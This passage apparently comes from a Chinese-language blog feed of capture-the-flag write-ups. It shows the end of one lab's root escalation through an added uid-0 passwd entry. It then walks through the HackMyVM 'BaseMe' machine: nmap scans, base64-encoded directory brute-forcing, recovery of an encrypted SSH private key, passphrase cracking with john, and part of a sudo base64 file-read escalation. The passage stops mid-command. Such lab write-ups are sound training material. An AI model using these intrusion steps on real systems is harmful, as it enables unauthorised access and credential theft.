class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>andeli:x:1000:1000:,,,:/home/andeli:/bin/bash<br>a3170:x:0:0:,,,:/home/a3170:/bin/bash<br></code></pre></td></tr></table></figure><p>重新登录用户<code>a3170</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">a3170@Space:~$ su a3170<br>Password: <br>root@Space:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@Space:~# <span class="hljs-built_in">cat</span> /root/root.txt<br>flag&#123;root-f9f8c2ea-4f00-11f0-9724-e7b0f6215b99&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内部靶机/Maze-sec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ssh私钥CRLF</tag>
      
      <tag>提权-dos2unix</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BaseMe</title>
    <link href="/hackmyvm/BaseMe/"/>
    <url>/hackmyvm/BaseMe/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://hackmyvm.eu/machines/machine.php?vm=BaseME">https://hackmyvm.eu/machines/machine.php?vm=BaseME</a></p><hr><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 11:06 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00029s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00023s latency).<br>MAC Address: 08:00:27:23:98:C6 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.37<br>Host is up (0.00079s latency).<br>MAC Address: 08:00:27:0D:F3:F8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.11 seconds<br></code></pre></td></tr></table></figure><p>IP地址：<code>192.168.2.37</code></p><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>1、全端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.37<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 11:06 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.37<br>Host is up (0.00037s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:0D:F3:F8 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 43.93 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sT -sV -sC -O --min-rate 10000 -p22,80 192.168.2.37<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 11:07 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.37<br>Host is up (0.00072s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 ca:09:80:f7:3a:da:5a:b6:19:d9:5c:41:47:43:d4:10 (RSA)<br>|   256 d0:75:48:48:b8:26:59:37:64:3b:25:7f:20:10:f8:70 (ECDSA)<br>|_  256 91:14:f7:93:0b:06:25:cb:e0:a5:30:e8:d3:d3:37:2b (ED25519)<br>80/tcp open  http    nginx 1.14.2<br>|_http-server-header: nginx/1.14.2<br>|_http-title: Site doesnt have a title (text/html).<br>MAC Address: 08:00:27:0D:F3:F8 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 4.15 - 5.8 (99%), Linux 5.0 - 5.5 (99%), Linux 5.0 - 5.4 (97%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 2.6.32 (96%), Linux 5.4 (95%), Synology DiskStation Manager 5.2-5644 (95%), Linux 3.1 (95%), Linux 3.2 (95%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.75 seconds<br></code></pre></td></tr></table></figure><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h2 id="1、curl-80端口"><a href="#1、curl-80端口" class="headerlink" title="1、curl-80端口"></a>1、curl-80端口</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# curl <span class="hljs-string">&#x27;http://192.168.2.37&#x27;</span><br>QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK<br><br>&lt;!--<br>iloveyou<br>youloveyou<br>shelovesyou<br>helovesyou<br>weloveyou<br>theyhatesme<br>--&gt;<br></code></pre></td></tr></table></figure><p>显示一串BASE64字符，同时下面还有注释，猜测是相关的密码</p><p>解密上述的base64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK&quot;</span> | <span class="hljs-built_in">base64</span> -d &gt;11.txt <br><br>┌──(root㉿kali)-[~]<br>└─# <span class="hljs-built_in">cat</span> 11.txt<br>ALL, absolutely ALL that you need is <span class="hljs-keyword">in</span> BASE64.<br>Including the password that you need :)<br>Remember, BASE64 has the answer to all your questions.<br>-lucas<br></code></pre></td></tr></table></figure><p>提示<code>你所需要的一切都在BASE64中。包括你需要的密码：) 请记住，BASE64有您所有问题的答案。</code><br>猜测所有的操作都需要经过base64编码</p><h2 id="2、目录爆破"><a href="#2、目录爆破" class="headerlink" title="2、目录爆破"></a>2、目录爆破</h2><p>目录爆破前先将字典加密成BASE64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt);<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span> | <span class="hljs-built_in">base64</span> &gt;&gt; dict64.txt;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>使用加密后的字典进行目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.37 -x php,bak,txt,html -w dict64.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.37<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                dict64.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,bak,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/aWRfcnNhCg==         (Status: 200) [Size: 2537]<br>/cm9ib3RzLnR4dAo=     (Status: 200) [Size: 25]<br>Progress: 23700 / 23705 (99.98%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>发现两个路径，依次查看，下载得到两个文件<br><code>/aWRfcnNhCg== </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFB<br>QUFBQ21GbGN6STFOaTFqZEhJQUFBQUdZbU55ZVhCMEFBQUFHQUFBQUJCVHhlOFlVTApCdHpmZnRB<br>ZFBncDhZWkFBQUFFQUFBQUFFQUFBRVhBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDWkNY<br>dkVQbk8xCmNiaHhxY3RCRWNCRFpqcXJGZm9sd1ZLbXBCZ1kwN00zQ0s3cE8xMFVnQnNMeVl3QXpK<br>RXc0ZTZZZ1BOU3lDRFdGYU5US0cKMDdqZ2NncmdncmU4ZVBDTU5GQkNBR2FZSG1MckZJc0tEQ0xJ<br>NE5FNTR0NThJVUhlWENaejcyeFRvYkwvcHRMazI2UkJuaAo3YkhHMUpqR2x4T2tPNm0rMW9GTkx0<br>TnVEMlFQbDhzYlp0RXpYNFM5bk5aL2RweVJwTWZtQjczck4zeXlJeWxldlZERXl2CmY3Q1o3b1JP<br>NDZ1RGdGUHk1VnprbmRDZUpGMll0WkJYZjVnamMyZmFqTVh2cStiOG9sOFJaWjZqSFhBaGlibEJY<br>d3BBbTQKdkxZZnh6STI3QlpGbm90ZUJuYmR6d1NMNWFwQkY1Z1lXSkFIS2ovSjZNaERqMUdLQUZj<br>MUFBQUQwTjlVRFRjVXh3TXQ1WApZRklaSzhpZUJMME5PdXdvY2RnYlV1a3RDMjFTZG5TeTZvY1cz<br>aW1NKzNteldqUGRvQksvSG8zMzl1UG1CV0k1c2JNcnBLCnhrWk1ubCtyY1RiZ3o0c3d2OGdOdUto<br>VWM3d1RndHJOWCtQTk1kSUFMTnBzeFlMdC9sNTZHSzhSNEo4ZkxJVTUrTW9qUnMKKzFOcllzOEo0<br>cm5PMXFXTm9KUlpvRGxBYVlxQlY5NWNYb0FFa3dVSFZ1c3RmZ3hVdHJZS3ArWVBGSWd4OG9rTWpK<br>Z25iaQpOTlczVHp4bHVOaTVvVWhhbEgyREoya2hLREdRVWk5Uk9GY3NFWGVKWHQzbGdwWlp0MWhy<br>UURBMW84alRYZVM0K2RXN25aCnpqZjNwME03N2IvTnZjWkUrb1hZUTFnNVhwMVFTT1Niait0bG13<br>NTRMN0VxYjFVaFpnblE3WnNLQ29hWTlTdUFjcW0zRTAKSUpoK0krWnYxZWdTTVMvRE9ISXhPM3Bz<br>UWtjaUxqa3BhK0d0d1FNbDFaQUpIUWFCNnE3MEpKY0JDZlZzeWtkWTUyTEtESQpweFpZcExabXlE<br>eDhUVGFBOEpPbXZHcGZOWmtNVTRJMGk1L1pUNjVTUkZKMU5sQkNOd2N3dE9sOWs0UFc1TFZ4TnNH<br>UkNKCk1KcjhrNUFjMENYMDNmWEVTcG1zVVVWUysvRGovaG50SHc4OWRPOEhjcXFJVUVwZUViZlRX<br>THZheDBDaVNoM0tqU2NlSnAKKzhnVXlER3ZDa2N5Vm5lVVFqbW1yUnN3UmhUTnh4S1JCWnNla0d3<br>SHBvOGhEWWJVRUZacXp6TEFRYkJJQWRybDF0dDdtVgp0VkJybXBNNkN3SmR6WUVsMjFGYUs4anZk<br>eUN3UHI1SFVndHV4clNwTHZuZGNud1BheEpXR2k0UDQ3MUREWmVSWURHY1doCmk2YklDckxRZ2VK<br>bEhhRVVtclFDNVJkdjAzendJOVU4RFhVWi9PSGI0MFBMOE1YcUJ0VS9iNkNFVTlKdXpKcEJyS1or<br>aysKdFNuN2hyOGhwcFQydFVTeER2QytVU01tdy9XRGZha2pmSHBvTndoN1B0NWkwY3d3cGtYRlF4<br>SlB2UjBiTHh2WFpuKzN4dwpON2J3NDVGaEJaQ3NIQ0FiVjIraFZzUDBseXhDUU9qN3lHa0JqYTg3<br>UzFlMHE2V1pqakI0U3ByZW5Ia083dGc1UTBIc3VNCkFpZi8wMkhIeldHK0NSL0lHbEZzTnRxMXZ5<br>bHQyeCtZLzA5MXZDa1JPQkRhd2pIei84b2d5MkZ6ZzhKWVRlb0xrSHdER1EKTytUb3dBMTBSQVRl<br>azZaRUl4aDZTbXRERy9WNXplV0N1RW1LNHNSVDNxMUZTdnBCMS9IK0Z4c0dDb1BJZzhGemNpR0No<br>MgpUTHVza2NYaWFnbnM5TjFSTE9ubEhoaVpkOFJaQTBaZzdvWklhQnZhWm5oWllHeWNwQUpwV0tl<br>YmpydG9rTFl1TWZYUkxsCjMvU0FlVWw3MkVBM20xRElueHNQZ3VGdWswMHJvTWM3N042ZXJZN3Rq<br>T1pMVllQb1NpeWdEUjFBN2Yzell6KzBpRkk0ckwKTkQ4aWtnbVF2RjZocnd3SkJycC8weEtFYU1U<br>Q0tMdnl5WjNlRFNkQkRQcmtUaGhGd3JQcEk2K0V4OFJ2Y1dJNmJUSkFXSgpMZG1tUlhVUy9EdE8r<br>NjkvYWlkdnhHQVlvYisxTT0KLS0tLS1FTkQgT1BFTlNTSCBQUklWQVRFIEtFWS0tLS0tCg==<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL<br>BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1<br>cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG<br>07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh<br>7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv<br>f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4<br>vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X<br>YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK<br>xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs<br>+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi<br>NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ<br>zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0<br>IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI<br>pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ<br>MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp<br>+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV<br>tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh<br>i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+<br>tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw<br>N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM<br>Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ<br>O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2<br>TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl<br>3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL<br>ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ<br>LdmmRXUS/DtO+69/aidvxGAYob+1M=<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p><code>/cm9ib3RzLnR4dAo=</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Tm90aGluZyBoZXJlIDooCg==<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nothing here :(<br></code></pre></td></tr></table></figure><h1 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h1><p>根据上述得到的ssh秘钥，尝试使用之前的看到的用户名<code>lucas</code>进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh lucas@192.168.2.37 -i ./id_rsa<br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;./id_rsa&#x27;</span>: <br></code></pre></td></tr></table></figure><p><code>私钥的权限必须为600</code></p><p>私钥需要密码，根据上述的密码进行BASE64编码后爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> 3.txt); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$i</span> | <span class="hljs-built_in">base64</span> &gt;&gt;33.txt;<span class="hljs-keyword">done</span><br><br>┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> 33.txt <br>aWxvdmV5b3UK<br>eW91bG92ZXlvdQo=<br>c2hlbG92ZXN5b3UK<br>aGVsb3Zlc3lvdQo=<br>d2Vsb3ZleW91Cg==<br>dGhleWhhdGVzbWUK<br></code></pre></td></tr></table></figure><p>使用<code>john</code>进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# ssh2john id_rsa <br><br>┌──(root㉿kali)-[/tmp]<br>└─# ssh2john id_rsa &gt; tmp            <br><br>┌──(root㉿kali)-[/tmp]<br>└─# john tmp --wordlist=output.txt   <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 16 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>Warning: Only 6 candidates left, minimum 8 needed <span class="hljs-keyword">for</span> performance.<br>aWxvdmV5b3UK     (id_rsa)     <br>1g 0:00:00:00 DONE (2025-06-23 16:49) 2.173g/s 13.04p/s 13.04c/s 13.04C/s aWxvdmV5b3UK..dGhleWhhdGVzbWUK<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucas@baseme:~$ <span class="hljs-built_in">cat</span> user.txt <br>HMV8nnJAJAJA<br></code></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>执行<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">lucas@baseme:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> lucas on baseme:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User lucas may run the following commands on baseme:<br>    (ALL) NOPASSWD: /usr/bin/base64<br></code></pre></td></tr></table></figure><p>发现base64不需要密码即可执行root权限，直接读取文件即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_read<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">base64</span> <span class="hljs-string">&quot;<span 